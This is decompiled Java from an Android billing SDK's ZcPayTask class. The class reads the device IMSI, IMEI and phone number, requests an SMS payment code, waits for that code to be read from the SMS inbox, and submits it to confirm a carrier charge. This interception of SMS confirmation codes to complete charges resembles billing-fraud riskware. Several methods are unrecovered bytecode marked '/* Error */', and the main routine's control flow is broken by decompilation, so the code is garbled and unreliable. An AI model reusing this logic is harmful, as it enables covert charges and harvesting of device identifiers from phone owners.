package com.upay.billing.engine.zcwap_u;

import android.content.Context;
import android.os.AsyncTask;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.upay.billing.UpayActivity;
import com.upay.billing.UpayConstant;
import com.upay.billing.UpayCore;
import com.upay.billing.bean.Cmd;
import com.upay.billing.bean.Plan;
import com.upay.billing.bean.Trade;
import com.upay.billing.engine.UpayCoreImpl;
import com.upay.billing.utils.HttpRunner;
import com.upay.billing.utils.Json;
import com.upay.billing.utils.Util;
import java.io.File;
import java.util.List;
import org.json.JSONObject;

public class ZcPayTask
  extends AsyncTask
{
  public static final String SP_MR = "sp/mr";
  private static final String TAG = "ZcPayTask";
  private String charge_request;
  private List<Cmd> cmds;
  private String code = null;
  private String exec_request;
  private String key = null;
  private Context mContext;
  private Trade mTrade;
  private String pid = null;
  private int reConnectionZcrespTag = 1;
  private int reconnectionZcOrYgTag = 1;
  private int reconnectionZcTag = 1;
  private String requestZcStr = null;
  private String response = null;
  private String responseStr = null;
  private int resultCode;
  private String resultMsg = null;
  private String svcid = null;
  public String zcConfirmUrl;
  public String zcRequestUrl;
  
  public ZcPayTask(Context paramContext, Trade paramTrade, List<Cmd> paramList)
  {
    this.mContext = paramContext;
    this.mTrade = paramTrade;
    this.cmds = paramList;
    paramContext = Json.parse(((Cmd)paramList.get(0)).msg);
    this.svcid = paramContext.getStr("svcid");
    this.pid = paramContext.getStr("pid");
    this.key = paramContext.getStr("key");
    this.zcRequestUrl = paramContext.getStr("request_url");
    this.zcConfirmUrl = paramContext.getStr("confirm_url");
  }
  
  public static void sp_mr(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    Util.addTask(new ZcPayTask.2(UpayConstant.API_BASE_URL + "sp/mr").addParam("cmd_key", paramString1).addParam("trade_id", paramString2).addParam("price", paramString3).addParam("result", paramString4).setRetry(3));
  }
  
  private String zcFailJson()
  {
    JSONObject localJSONObject = new JSONObject();
    try
    {
      localJSONObject.put("resultCode", 108);
      localJSONObject.put("resultMsg", "失败");
      localJSONObject.put("orderid", "000");
      return localJSONObject.toString();
    }
    catch (Exception localException)
    {
      for (;;)
      {
        localException.printStackTrace();
      }
    }
  }
  
  protected Object doInBackground(Object... paramVarArgs)
  {
    Plan localPlan = UpayCore.getInstance(this.mContext).getPlan(this.mTrade.appKey);
    paramVarArgs = ((TelephonyManager)this.mContext.getSystemService("phone")).getSubscriberId();
    Object localObject1 = UpayCore.getInstance(this.mContext).getUser().getStr("mobile");
    if (!Util.empty((String)localObject1)) {
      Util.saveString(this.mContext, "mymobile", (String)localObject1);
    }
    localObject1 = Util.getString(this.mContext, "mymobile");
    int i;
    if ((!paramVarArgs.equals(Util.getString(this.mContext, "imsi"))) || (localObject1 == null) || ("".equals(localObject1)))
    {
      showProgressUi(localPlan, this.mTrade, "upay_progress_ui", UpayCore.getInstance(this.mContext).getPropString("zcwap", "get_mobile_num", "正在获取您的手机号，请稍后..."));
      Util.saveString(this.mContext, "mymobile", "");
      Util.saveString(this.mContext, "imsi", paramVarArgs);
      Util.getUser(this.mContext);
      localObject1 = Util.getString(this.mContext, "mymobile");
      if ((!paramVarArgs.equals(Util.getString(this.mContext, "imsi"))) || (localObject1 == null) || ("".equals(localObject1)))
      {
        UpayCoreImpl.getPhoneNumber(this.mContext);
        paramVarArgs = new boolean[1];
        paramVarArgs[0] = 0;
        i = 30;
      }
    }
    for (;;)
    {
      int j = i - 1;
      if ((i > 0) && (paramVarArgs[0] == 0)) {}
      try
      {
        Thread.sleep(3000L);
        if ((Util.getString(this.mContext, "mymobile") != null) && (!"".equals(Util.getString(this.mContext, "mymobile"))))
        {
          paramVarArgs[0] = 1;
          i = j;
          continue;
          if (j < 0) {
            return "nonumber";
          }
          UpayActivity.finish(this.mContext, "upay_progress_ui");
          showProgressUi(localPlan, this.mTrade, "upay_progress_ui", UpayCore.getInstance(this.mContext).getPropString("zcwap", "tip_read_sms", "正在等待下发短信验证码，本应用将会访问您的短信收件箱以读取验证码."));
          localObject1 = requestZc();
          if (!"(White) Not tel exits!".equals(((String)localObject1).trim()))
          {
            paramVarArgs = (Object[])localObject1;
            if (!"(Get) Not tel exits!".equals(((String)localObject1).trim())) {}
          }
          else
          {
            paramVarArgs = zcFailJson();
          }
          localObject1 = null;
          try
          {
            localObject2 = Json.parse(paramVarArgs);
            if (paramVarArgs.contains("errorCode"))
            {
              this.resultCode = ((Json)localObject2).getInt("errorCode");
              this.resultMsg = ((Json)localObject2).getStr("errorDesc");
            }
            for (paramVarArgs = (Object[])localObject1;; paramVarArgs = ((Json)localObject2).getStr("outTradeNo"))
            {
              Log.i("ZcPayTask", "zc-request:code=" + this.resultCode + ",msg=" + this.resultMsg);
              if (this.resultCode == 0) {
                break;
              }
              return "verifyfail";
              this.resultCode = ((Json)localObject2).getInt("resultCode");
              this.resultMsg = ((Json)localObject2).getStr("resultDescription");
            }
          }
          catch (Exception paramVarArgs)
          {
            return "analysisfail";
          }
          tmp537_534[0] = "trade_id";
          Object[] tmp542_537 = tmp537_534;
          tmp542_537[1] = this.mTrade.id;
          Object[] tmp552_542 = tmp542_537;
          tmp552_542[2] = "goods_key";
          Object[] tmp558_552 = tmp552_542;
          tmp558_552[3] = this.mTrade.goodsKey;
          Object[] tmp568_558 = tmp558_552;
          tmp568_558[4] = "cmd_key";
          Object[] tmp573_568 = tmp568_558;
          tmp573_568[5] = ((Cmd)this.cmds.get(0)).key;
          Object[] tmp592_573 = tmp573_568;
          tmp592_573[6] = "bt_key";
          Object[] tmp599_592 = tmp592_573;
          tmp599_592[7] = ((Cmd)this.cmds.get(0)).btKey;
          Object[] tmp619_599 = tmp599_592;
          tmp619_599[8] = "target";
          Object[] tmp626_619 = tmp619_599;
          tmp626_619[9] = ((Cmd)this.cmds.get(0)).num;
          Object[] tmp646_626 = tmp626_619;
          tmp646_626[10] = "sn";
          Object[] tmp653_646 = tmp646_626;
          tmp653_646[11] = (this.mTrade.id + "01");
          Object[] tmp683_653 = tmp653_646;
          tmp683_653[12] = "request";
          Object[] tmp690_683 = tmp683_653;
          tmp690_683[13] = ((Cmd)this.cmds.get(0)).msg;
          Object[] tmp710_690 = tmp690_683;
          tmp710_690[14] = "response";
          Object[] tmp717_710 = tmp710_690;
          tmp717_710[15] = "zc-wap-u";
          Object[] tmp724_717 = tmp717_710;
          tmp724_717[16] = "ts";
          Object[] tmp731_724 = tmp724_717;
          tmp731_724[17] = Long.valueOf(Util.getTs());
          Object[] tmp741_731 = tmp731_724;
          tmp741_731[18] = "result";
          Object[] tmp747_741 = tmp741_731;
          tmp747_741[19] = String.valueOf(200);
          Object[] tmp757_747 = tmp747_741;
          tmp757_747[20] = "price";
          Object[] tmp763_757 = tmp757_747;
          tmp763_757[21] = Integer.valueOf(this.mTrade.price);
          UpayCore.getInstance(this.mContext).logEvent(this.mTrade.appKey, "exec_pay", Json.createObject(tmp763_757).asObject().toString());
          localObject1 = new boolean[1];
          localObject1[0] = 0;
          i = 30;
          j = i - 1;
          if ((i <= 0) || (localObject1[0] != 0)) {}
        }
      }
      catch (InterruptedException localInterruptedException1)
      {
        try
        {
          for (;;)
          {
            Thread.sleep(3000L);
            Object localObject2 = Util.getString(this.mContext, "verifycode");
            if ((localObject2 != null) && (!"".equals(localObject2))) {
              localObject1[0] = 1;
            }
            i = j;
          }
          if (j < 0) {
            return "verifyfail";
          }
          UpayActivity.finish(this.mContext, "upay_progress_ui");
          showProgressUi(localPlan, this.mTrade, "upay_progress_ui", UpayCore.getInstance(this.mContext).getPropString("zcwap", "tip_confirm_sms", "正在提交验证码，请稍后..."));
          paramVarArgs = getZcPay(paramVarArgs);
          try
          {
            localObject1 = Json.parse(paramVarArgs);
            if (paramVarArgs.contains("errorCode")) {
              this.code = ((Json)localObject1).getStr("errorCode");
            }
            for (this.resultMsg = ((Json)localObject1).getStr("errorDesc");; this.resultMsg = ((Json)localObject1).getStr("resultDescription"))
            {
              Log.i("ZcPayTask", "zc-confirm:code=" + this.code + ",msg=" + this.resultMsg);
              if (this.code.equals("0")) {
                break;
              }
              return "payfail";
              this.code = ((Json)localObject1).getStr("resultCode");
            }
            return "paysuccess";
          }
          catch (Exception paramVarArgs)
          {
            return "payfail";
          }
          i = j;
          continue;
          localInterruptedException1 = localInterruptedException1;
        }
        catch (InterruptedException localInterruptedException2)
        {
          for (;;) {}
        }
      }
    }
  }
  
  /* Error */
  public String getZcPay(String paramString)
  {
    // Byte code:
    //   0: ldc_w 419
    //   3: ldc_w 421
    //   6: invokestatic 321	android/util/Log:i	(Ljava/lang/String;Ljava/lang/String;)I
    //   9: pop
    //   10: new 423	java/util/ArrayList
    //   13: dup
    //   14: invokespecial 424	java/util/ArrayList:<init>	()V
    //   17: astore_2
    //   18: invokestatic 427	com/upay/billing/utils/Util:getUnixTime	()Ljava/lang/String;
    //   21: astore_3
    //   22: aload_0
    //   23: getfield 64	com/upay/billing/engine/zcwap_u/ZcPayTask:mContext	Landroid/content/Context;
    //   26: ldc_w 397
    //   29: invokestatic 228	com/upay/billing/utils/Util:getString	(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
    //   32: astore 4
    //   34: aload_2
    //   35: new 429	org/apache/http/message/BasicNameValuePair
    //   38: dup
    //   39: ldc_w 327
    //   42: aload_1
    //   43: invokespecial 432	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   46: invokeinterface 435 2 0
    //   51: pop
    //   52: aload_2
    //   53: new 429	org/apache/http/message/BasicNameValuePair
    //   56: dup
    //   57: ldc_w 437
    //   60: aload 4
    //   62: invokespecial 432	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   65: invokeinterface 435 2 0
    //   70: pop
    //   71: aload_2
    //   72: new 429	org/apache/http/message/BasicNameValuePair
    //   75: dup
    //   76: ldc_w 439
    //   79: aload_3
    //   80: invokespecial 432	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   83: invokeinterface 435 2 0
    //   88: pop
    //   89: aload_2
    //   90: new 429	org/apache/http/message/BasicNameValuePair
    //   93: dup
    //   94: ldc_w 441
    //   97: aload_0
    //   98: aload_1
    //   99: aload 4
    //   101: aload_3
    //   102: aload_0
    //   103: getfield 60	com/upay/billing/engine/zcwap_u/ZcPayTask:key	Ljava/lang/String;
    //   106: invokevirtual 445	com/upay/billing/engine/zcwap_u/ZcPayTask:sign_c	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   109: iconst_0
    //   110: invokestatic 449	com/upay/billing/utils/Util:md5	(Ljava/lang/String;Z)Ljava/lang/String;
    //   113: invokespecial 432	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   116: invokeinterface 435 2 0
    //   121: pop
    //   122: aload_2
    //   123: ldc_w 451
    //   126: invokestatic 457	org/apache/http/client/utils/URLEncodedUtils:format	(Ljava/util/List;Ljava/lang/String;)Ljava/lang/String;
    //   129: astore_2
    //   130: new 459	org/apache/http/client/methods/HttpGet
    //   133: dup
    //   134: new 109	java/lang/StringBuilder
    //   137: dup
    //   138: invokespecial 110	java/lang/StringBuilder:<init>	()V
    //   141: aload_0
    //   142: getfield 100	com/upay/billing/engine/zcwap_u/ZcPayTask:zcConfirmUrl	Ljava/lang/String;
    //   145: invokevirtual 119	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   148: ldc_w 461
    //   151: invokevirtual 119	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   154: aload_2
    //   155: invokevirtual 119	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   158: invokevirtual 123	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   161: invokespecial 462	org/apache/http/client/methods/HttpGet:<init>	(Ljava/lang/String;)V
    //   164: astore_2
    //   165: new 464	org/apache/http/impl/client/DefaultHttpClient
    //   168: dup
    //   169: invokespecial 465	org/apache/http/impl/client/DefaultHttpClient:<init>	()V
    //   172: astore_3
    //   173: aload_3
    //   174: invokeinterface 471 1 0
    //   179: ldc_w 473
    //   182: sipush 30000
    //   185: invokestatic 383	java/lang/Integer:valueOf	(I)Ljava/lang/Integer;
    //   188: invokeinterface 479 3 0
    //   193: pop
    //   194: aload_3
    //   195: invokeinterface 471 1 0
    //   200: ldc_w 481
    //   203: sipush 30000
    //   206: invokestatic 383	java/lang/Integer:valueOf	(I)Ljava/lang/Integer;
    //   209: invokeinterface 479 3 0
    //   214: pop
    //   215: aload_3
    //   216: aload_2
    //   217: invokeinterface 485 2 0
    //   222: astore_2
    //   223: aload_2
    //   224: invokeinterface 491 1 0
    //   229: invokeinterface 497 1 0
    //   234: sipush 200
    //   237: if_icmpne +89 -> 326
    //   240: new 499	java/io/BufferedReader
    //   243: dup
    //   244: new 501	java/io/InputStreamReader
    //   247: dup
    //   248: aload_2
    //   249: invokeinterface 505 1 0
    //   254: invokeinterface 511 1 0
    //   259: invokespecial 514	java/io/InputStreamReader:<init>	(Ljava/io/InputStream;)V
    //   262: invokespecial 517	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   265: astore_2
    //   266: new 519	java/lang/StringBuffer
    //   269: dup
    //   270: invokespecial 520	java/lang/StringBuffer:<init>	()V
    //   273: astore_3
    //   274: aload_2
    //   275: invokevirtual 523	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   278: astore 4
    //   280: aload 4
    //   282: ifnull +24 -> 306
    //   285: aload_3
    //   286: aload 4
    //   288: invokevirtual 526	java/lang/StringBuffer:append	(Ljava/lang/String;)Ljava/lang/StringBuffer;
    //   291: pop
    //   292: goto -18 -> 274
    //   295: astore_2
    //   296: aload_0
    //   297: aload_1
    //   298: invokevirtual 529	com/upay/billing/engine/zcwap_u/ZcPayTask:reGetZcPay	(Ljava/lang/String;)V
    //   301: aload_0
    //   302: getfield 42	com/upay/billing/engine/zcwap_u/ZcPayTask:response	Ljava/lang/String;
    //   305: areturn
    //   306: aload_0
    //   307: aload_3
    //   308: invokevirtual 530	java/lang/StringBuffer:toString	()Ljava/lang/String;
    //   311: putfield 42	com/upay/billing/engine/zcwap_u/ZcPayTask:response	Ljava/lang/String;
    //   314: goto -13 -> 301
    //   317: astore_2
    //   318: aload_0
    //   319: aload_1
    //   320: invokevirtual 529	com/upay/billing/engine/zcwap_u/ZcPayTask:reGetZcPay	(Ljava/lang/String;)V
    //   323: goto -22 -> 301
    //   326: aload_0
    //   327: ldc_w 532
    //   330: putfield 42	com/upay/billing/engine/zcwap_u/ZcPayTask:response	Ljava/lang/String;
    //   333: goto -32 -> 301
    //   336: astore_2
    //   337: aload_0
    //   338: aload_1
    //   339: invokevirtual 529	com/upay/billing/engine/zcwap_u/ZcPayTask:reGetZcPay	(Ljava/lang/String;)V
    //   342: goto -41 -> 301
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	345	0	this	ZcPayTask
    //   0	345	1	paramString	String
    //   17	258	2	localObject1	Object
    //   295	1	2	localClientProtocolException	org.apache.http.client.ClientProtocolException
    //   317	1	2	localIllegalStateException	IllegalStateException
    //   336	1	2	localIOException	java.io.IOException
    //   21	287	3	localObject2	Object
    //   32	255	4	str	String
    // Exception table:
    //   from	to	target	type
    //   0	274	295	org/apache/http/client/ClientProtocolException
    //   274	280	295	org/apache/http/client/ClientProtocolException
    //   285	292	295	org/apache/http/client/ClientProtocolException
    //   306	314	295	org/apache/http/client/ClientProtocolException
    //   326	333	295	org/apache/http/client/ClientProtocolException
    //   0	274	317	java/lang/IllegalStateException
    //   274	280	317	java/lang/IllegalStateException
    //   285	292	317	java/lang/IllegalStateException
    //   306	314	317	java/lang/IllegalStateException
    //   326	333	317	java/lang/IllegalStateException
    //   0	274	336	java/io/IOException
    //   274	280	336	java/io/IOException
    //   285	292	336	java/io/IOException
    //   306	314	336	java/io/IOException
    //   326	333	336	java/io/IOException
  }
  
  protected void onPostExecute(Object paramObject)
  {
    super.onPostExecute(paramObject);
    paramObject = paramObject.toString();
    if ("paysuccess".equals(paramObject))
    {
      UpayCore.getInstance(this.mContext).paymentCompleted(this.mTrade, 200);
      UpayCore.getInstance(this.mContext).tradeUpdated(this.mTrade, ((Cmd)this.cmds.get(0)).key, 1, 200);
      this.exec_request = String.valueOf(200);
      this.charge_request = String.valueOf(200);
      UpayCore.getInstance(this.mContext).logEvent(this.mTrade.appKey, "charge_handle", Json.createObject(new Object[] { "trade_id", this.mTrade.id, "goods_key", this.mTrade.goodsKey, "cmd_key", ((Cmd)this.cmds.get(0)).key, "bt_key", ((Cmd)this.cmds.get(0)).btKey, "description", "zc-wap-u", "msg", "", "num", "", "result", this.charge_request, "sn", this.mTrade.id + "01", "ts", Long.valueOf(Util.getTs()), "price", Integer.valueOf(this.mTrade.price) }).asObject().toString());
      sp_mr(((Cmd)this.cmds.get(0)).key, this.mTrade.id + "01", String.valueOf(this.mTrade.price), "200");
    }
    for (;;)
    {
      Util.saveString(this.mContext, "verifycode", "");
      UpayActivity.finish(this.mContext, "upay_progress_ui");
      return;
      if ("payfail".equals(paramObject))
      {
        if ((this.code != null) && (!"".equals(this.code))) {
          UpayCore.getInstance(this.mContext).paymentCompleted(this.mTrade, Integer.valueOf(this.code).intValue());
        }
        for (this.charge_request = this.code;; this.charge_request = String.valueOf(122))
        {
          this.exec_request = String.valueOf(122);
          UpayCore.getInstance(this.mContext).logEvent(this.mTrade.appKey, "charge_handle", Json.createObject(new Object[] { "trade_id", this.mTrade.id, "goods_key", this.mTrade.goodsKey, "cmd_key", ((Cmd)this.cmds.get(0)).key, "bt_key", ((Cmd)this.cmds.get(0)).btKey, "description", "zc-wap-u-submit-verification-fail：code=" + this.charge_request + ",msg=" + this.resultMsg, "msg", "", "num", "", "result", Integer.valueOf(122), "sn", this.mTrade.id + "01", "ts", Long.valueOf(Util.getTs()), "price", Integer.valueOf(this.mTrade.price) }).asObject().toString());
          break;
          UpayCore.getInstance(this.mContext).paymentCompleted(this.mTrade, 122);
        }
      }
      if ("verifyfail".equals(paramObject))
      {
        if (this.resultCode != 0)
        {
          UpayCore.getInstance(this.mContext).paymentCompleted(this.mTrade, 150);
          this.exec_request = String.valueOf(this.resultCode);
          UpayCore.getInstance(this.mContext).logEvent(this.mTrade.appKey, "exec_pay", Json.createObject(new Object[] { "trade_id", this.mTrade.id, "goods_key", this.mTrade.goodsKey, "cmd_key", ((Cmd)this.cmds.get(0)).key, "bt_key", ((Cmd)this.cmds.get(0)).btKey, "target", ((Cmd)this.cmds.get(0)).num, "sn", this.mTrade.id + "01", "request", ((Cmd)this.cmds.get(0)).msg, "response", "zc-wap-u-request-verification-code-failed : code=" + this.exec_request + ",msg=" + this.resultMsg, "ts", Long.valueOf(Util.getTs()), "result", Integer.valueOf(150), "price", Integer.valueOf(this.mTrade.price) }).asObject().toString());
        }
        else
        {
          UpayCore.getInstance(this.mContext).paymentCompleted(this.mTrade, 150);
          this.charge_request = String.valueOf(150);
          UpayCore.getInstance(this.mContext).logEvent(this.mTrade.appKey, "charge_handle", Json.createObject(new Object[] { "trade_id", this.mTrade.id, "goods_key", this.mTrade.goodsKey, "cmd_key", ((Cmd)this.cmds.get(0)).key, "bt_key", ((Cmd)this.cmds.get(0)).btKey, "description", "zc-wap-u-get-verification-code-failed : code=" + this.charge_request, "msg", "", "num", "", "result", this.charge_request, "sn", this.mTrade.id + "01", "ts", Long.valueOf(Util.getTs()), "price", Integer.valueOf(this.mTrade.price) }).asObject().toString());
        }
      }
      else if ("nonumber".equals(paramObject))
      {
        UpayCore.getInstance(this.mContext).paymentCompleted(this.mTrade, 151);
        this.exec_request = String.valueOf(151);
        this.charge_request = String.valueOf(151);
        UpayCore.getInstance(this.mContext).logEvent(this.mTrade.appKey, "exec_pay", Json.createObject(new Object[] { "trade_id", this.mTrade.id, "goods_key", this.mTrade.goodsKey, "cmd_key", ((Cmd)this.cmds.get(0)).key, "bt_key", ((Cmd)this.cmds.get(0)).btKey, "target", ((Cmd)this.cmds.get(0)).num, "sn", this.mTrade.id + "01", "request", ((Cmd)this.cmds.get(0)).msg, "response", "zc-wap-u-access-to-mobile-phone-number-failed ：code=" + this.exec_request, "ts", Long.valueOf(Util.getTs()), "result", this.exec_request, "price", Integer.valueOf(this.mTrade.price) }).asObject().toString());
      }
      else if ("analysisfail".equals(paramObject))
      {
        UpayCore.getInstance(this.mContext).paymentCompleted(this.mTrade, 150);
        this.exec_request = String.valueOf(150);
        UpayCore.getInstance(this.mContext).logEvent(this.mTrade.appKey, "exec_pay", Json.createObject(new Object[] { "trade_id", this.mTrade.id, "goods_key", this.mTrade.goodsKey, "cmd_key", ((Cmd)this.cmds.get(0)).key, "bt_key", ((Cmd)this.cmds.get(0)).btKey, "target", ((Cmd)this.cmds.get(0)).num, "sn", this.mTrade.id + "01", "request", ((Cmd)this.cmds.get(0)).msg, "response", "zc-wap-u-request-return-value-fail:code=" + this.exec_request, "ts", Long.valueOf(Util.getTs()), "result", this.exec_request, "price", Integer.valueOf(this.mTrade.price) }).asObject().toString());
      }
    }
  }
  
  protected void onPreExecute()
  {
    super.onPreExecute();
  }
  
  public void reGetZcPay(String paramString)
  {
    if (this.reConnectionZcrespTag < 4)
    {
      Log.i("ZcPayTask", "reconnection:" + this.reConnectionZcrespTag);
      this.reConnectionZcrespTag += 1;
      getZcPay(paramString);
      return;
    }
    this.response = "timeout";
  }
  
  public void reRequestZc()
  {
    if (this.reconnectionZcTag < 4)
    {
      Log.i("ZcPayTask", "reconnection:" + this.reconnectionZcTag);
      this.reconnectionZcTag += 1;
      requestZc();
      return;
    }
    this.requestZcStr = "timeout";
  }
  
  /* Error */
  public String requestZc()
  {
    // Byte code:
    //   0: ldc 11
    //   2: ldc_w 583
    //   5: invokestatic 321	android/util/Log:i	(Ljava/lang/String;Ljava/lang/String;)I
    //   8: pop
    //   9: new 423	java/util/ArrayList
    //   12: dup
    //   13: invokespecial 424	java/util/ArrayList:<init>	()V
    //   16: astore_1
    //   17: invokestatic 427	com/upay/billing/utils/Util:getUnixTime	()Ljava/lang/String;
    //   20: astore_2
    //   21: aload_1
    //   22: new 429	org/apache/http/message/BasicNameValuePair
    //   25: dup
    //   26: ldc 86
    //   28: aload_0
    //   29: getfield 56	com/upay/billing/engine/zcwap_u/ZcPayTask:svcid	Ljava/lang/String;
    //   32: invokespecial 432	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   35: invokeinterface 435 2 0
    //   40: pop
    //   41: aload_1
    //   42: new 429	org/apache/http/message/BasicNameValuePair
    //   45: dup
    //   46: ldc 91
    //   48: aload_0
    //   49: getfield 58	com/upay/billing/engine/zcwap_u/ZcPayTask:pid	Ljava/lang/String;
    //   52: invokespecial 432	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   55: invokeinterface 435 2 0
    //   60: pop
    //   61: aload_1
    //   62: new 429	org/apache/http/message/BasicNameValuePair
    //   65: dup
    //   66: ldc_w 585
    //   69: aload_2
    //   70: invokespecial 432	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   73: invokeinterface 435 2 0
    //   78: pop
    //   79: aload_1
    //   80: new 429	org/apache/http/message/BasicNameValuePair
    //   83: dup
    //   84: ldc_w 441
    //   87: aload_0
    //   88: aload_0
    //   89: getfield 56	com/upay/billing/engine/zcwap_u/ZcPayTask:svcid	Ljava/lang/String;
    //   92: aload_0
    //   93: getfield 58	com/upay/billing/engine/zcwap_u/ZcPayTask:pid	Ljava/lang/String;
    //   96: aload_0
    //   97: getfield 60	com/upay/billing/engine/zcwap_u/ZcPayTask:key	Ljava/lang/String;
    //   100: invokevirtual 587	com/upay/billing/engine/zcwap_u/ZcPayTask:sign	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   103: iconst_0
    //   104: invokestatic 449	com/upay/billing/utils/Util:md5	(Ljava/lang/String;Z)Ljava/lang/String;
    //   107: invokespecial 432	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   110: invokeinterface 435 2 0
    //   115: pop
    //   116: aload_1
    //   117: new 429	org/apache/http/message/BasicNameValuePair
    //   120: dup
    //   121: ldc -26
    //   123: aload_0
    //   124: getfield 64	com/upay/billing/engine/zcwap_u/ZcPayTask:mContext	Landroid/content/Context;
    //   127: invokestatic 186	com/upay/billing/UpayCore:getInstance	(Landroid/content/Context;)Lcom/upay/billing/UpayCore;
    //   130: invokevirtual 591	com/upay/billing/UpayCore:getUpayContext	()Lcom/upay/billing/UpayContext;
    //   133: getfield 595	com/upay/billing/UpayContext:imsi	Ljava/lang/String;
    //   136: invokespecial 432	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   139: invokeinterface 435 2 0
    //   144: pop
    //   145: aload_1
    //   146: new 429	org/apache/http/message/BasicNameValuePair
    //   149: dup
    //   150: ldc_w 597
    //   153: aload_0
    //   154: getfield 64	com/upay/billing/engine/zcwap_u/ZcPayTask:mContext	Landroid/content/Context;
    //   157: invokestatic 186	com/upay/billing/UpayCore:getInstance	(Landroid/content/Context;)Lcom/upay/billing/UpayCore;
    //   160: invokevirtual 591	com/upay/billing/UpayCore:getUpayContext	()Lcom/upay/billing/UpayContext;
    //   163: getfield 599	com/upay/billing/UpayContext:imei	Ljava/lang/String;
    //   166: invokespecial 432	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   169: invokeinterface 435 2 0
    //   174: pop
    //   175: aload_1
    //   176: new 429	org/apache/http/message/BasicNameValuePair
    //   179: dup
    //   180: ldc_w 601
    //   183: aload_0
    //   184: getfield 64	com/upay/billing/engine/zcwap_u/ZcPayTask:mContext	Landroid/content/Context;
    //   187: ldc -36
    //   189: invokestatic 228	com/upay/billing/utils/Util:getString	(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
    //   192: invokespecial 432	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   195: invokeinterface 435 2 0
    //   200: pop
    //   201: aload_1
    //   202: ldc_w 451
    //   205: invokestatic 457	org/apache/http/client/utils/URLEncodedUtils:format	(Ljava/util/List;Ljava/lang/String;)Ljava/lang/String;
    //   208: astore_1
    //   209: new 459	org/apache/http/client/methods/HttpGet
    //   212: dup
    //   213: new 109	java/lang/StringBuilder
    //   216: dup
    //   217: invokespecial 110	java/lang/StringBuilder:<init>	()V
    //   220: aload_0
    //   221: getfield 96	com/upay/billing/engine/zcwap_u/ZcPayTask:zcRequestUrl	Ljava/lang/String;
    //   224: invokevirtual 119	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   227: ldc_w 461
    //   230: invokevirtual 119	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   233: aload_1
    //   234: invokevirtual 119	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   237: invokevirtual 123	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   240: invokespecial 462	org/apache/http/client/methods/HttpGet:<init>	(Ljava/lang/String;)V
    //   243: astore_1
    //   244: new 464	org/apache/http/impl/client/DefaultHttpClient
    //   247: dup
    //   248: invokespecial 465	org/apache/http/impl/client/DefaultHttpClient:<init>	()V
    //   251: astore_2
    //   252: aload_2
    //   253: invokeinterface 471 1 0
    //   258: ldc_w 473
    //   261: sipush 30000
    //   264: invokestatic 383	java/lang/Integer:valueOf	(I)Ljava/lang/Integer;
    //   267: invokeinterface 479 3 0
    //   272: pop
    //   273: aload_2
    //   274: invokeinterface 471 1 0
    //   279: ldc_w 481
    //   282: sipush 30000
    //   285: invokestatic 383	java/lang/Integer:valueOf	(I)Ljava/lang/Integer;
    //   288: invokeinterface 479 3 0
    //   293: pop
    //   294: aload_2
    //   295: aload_1
    //   296: invokeinterface 485 2 0
    //   301: astore_1
    //   302: aload_1
    //   303: invokeinterface 491 1 0
    //   308: invokeinterface 497 1 0
    //   313: sipush 200
    //   316: if_icmpne +84 -> 400
    //   319: new 499	java/io/BufferedReader
    //   322: dup
    //   323: new 501	java/io/InputStreamReader
    //   326: dup
    //   327: aload_1
    //   328: invokeinterface 505 1 0
    //   333: invokeinterface 511 1 0
    //   338: invokespecial 514	java/io/InputStreamReader:<init>	(Ljava/io/InputStream;)V
    //   341: invokespecial 517	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   344: astore_1
    //   345: new 519	java/lang/StringBuffer
    //   348: dup
    //   349: invokespecial 520	java/lang/StringBuffer:<init>	()V
    //   352: astore_2
    //   353: aload_1
    //   354: invokevirtual 523	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   357: astore_3
    //   358: aload_3
    //   359: ifnull +22 -> 381
    //   362: aload_2
    //   363: aload_3
    //   364: invokevirtual 526	java/lang/StringBuffer:append	(Ljava/lang/String;)Ljava/lang/StringBuffer;
    //   367: pop
    //   368: goto -15 -> 353
    //   371: astore_1
    //   372: aload_0
    //   373: invokevirtual 603	com/upay/billing/engine/zcwap_u/ZcPayTask:reRequestZc	()V
    //   376: aload_0
    //   377: getfield 52	com/upay/billing/engine/zcwap_u/ZcPayTask:requestZcStr	Ljava/lang/String;
    //   380: areturn
    //   381: aload_0
    //   382: aload_2
    //   383: invokevirtual 530	java/lang/StringBuffer:toString	()Ljava/lang/String;
    //   386: putfield 52	com/upay/billing/engine/zcwap_u/ZcPayTask:requestZcStr	Ljava/lang/String;
